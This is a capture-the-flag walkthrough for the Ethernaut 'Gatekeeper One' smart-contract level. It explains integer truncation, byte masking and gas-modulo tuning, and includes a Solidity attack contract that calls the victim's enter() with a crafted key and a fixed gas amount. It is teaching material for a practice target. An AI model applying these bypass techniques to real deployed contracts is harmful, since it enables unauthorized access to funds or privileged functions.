# Day 13 - Gate Keeper (1)

## Datatype conversions (Gate 2)

Whenever you convert a datapoint with larger storage space into a smaller one, you will lose and corrupt your data.

![Datatype conversion](./images/type-conversion.jpg)

## Byte masking (Gate 3)

```js
bytes4 a = 0xffffffff;
bytes4 mask = 0xf0f0f0f0;
bytes4 result = a & mask ;   // 0xf0f0f0f0
```

## Solution

### Gate 1

Pass Gate 1 by simply letting your contract be the middleman

### Gate 3

Gate 3 takes in an 8 byte key, and has the following requirements:

```js
// uint32 => 4 bytes (max 0xffffffff)
// uint64 => 8 bytes (max 0xffffffffffffffff)
// uint16 => 2 bytes (max 0xffff)
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
require(uint32(uint64(_gateKey)) != uint64(_gateKey));
require(uint32(uint64(_gateKey)) == uint16(tx.origin));
```

### Gate 2

to pass Gate 2’s require(`msg.gas % 8191 == 0`), you have to ensure that your remaining gas is an integer multiple of 8191, at the particular moment when `msg.gas % 8191` is executed in the call stack.

gateTwo requires some trial and error regarding how much gas you should use. The simplest way to do this is to use .call() because you can specify exactly how much gas you want to use. Once you've initiated a failed transaction, play around with the remix debugger. Essentially you want to calculate the total cost of getting to exactly the point prior to the gasleft()%8191 == 0. For me, this is 254 gas so to pass this gate, I just needed to use a gas equivalent to some multiple of 8191 + 254 e.g. 8191 \* 100 + 254 = 819354

Notice GatekeeperOne was compiled with version v0.5.0 with no optimization enabled. Update your Remix settings accordingly.

Create a function which will call enter() and allocate a specified amount of gas. You should invoke enter() with the lower level call function, which gives you more control over gas usage. Allocate some arbitrary amount of gas:

```js
contract AttackGatekeeperOne {
    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    // require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");


    function part3(bytes8 _gateKey) public view returns(bool) {
        // _gateKey has 16 characters
        // uint16(msg.sender) = truncating everything else but the last 4 characters of my address (733c) and converting it into uint16 returns 29500
        // for uint32 == uint16, the former needs to be left padded with 0s e.g. 00001234 == 1234 = true
        // solving uint32(uint64(_gateKey)) is trivial because it is the same as described above.
        // This function will return true for any _gateKey with the values XXXXXXXX0000733c where X can be hexidecimal character.
        return uint32(uint64(_gateKey)) == uint16(msg.sender);
    }

    function part2(bytes8 _gateKey) public pure returns(bool) {
        // This is saying that the truncated version of the _gateKey cannot match the original
        // e.g. Using 000000000000733c will fail because the return values for both are equal
        // However, as long as you can change any of the first 8 characters, this will pass.
        return uint32(uint64(_gateKey)) != uint64(_gateKey);
    }

    function part1(bytes8 _gateKey) public pure returns(bool) {
        // you can ignore the uint64 casting because it appears on both sides.
        // this is equivalent to uint32(_gateKey) == uint64(_gateKey);
        // the solution to this is the same as the solution to part3 i.e. you want a _gateKey where the last 8 digits is the same as the last 4 digits after
        // it is converted to a uint so something like 0000733c will pass.
        return uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));
    }

    // So the solution to this is to use XXXXXXXX0000<insert last 4 characters of your address> where X can be any hexidecimal characters except 00000000.
    function enter(bytes8 _key) public returns(bool) {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = victim.call{gas: 819354}(payload);
        require(success, "failed somewhere...");
    }
}
```
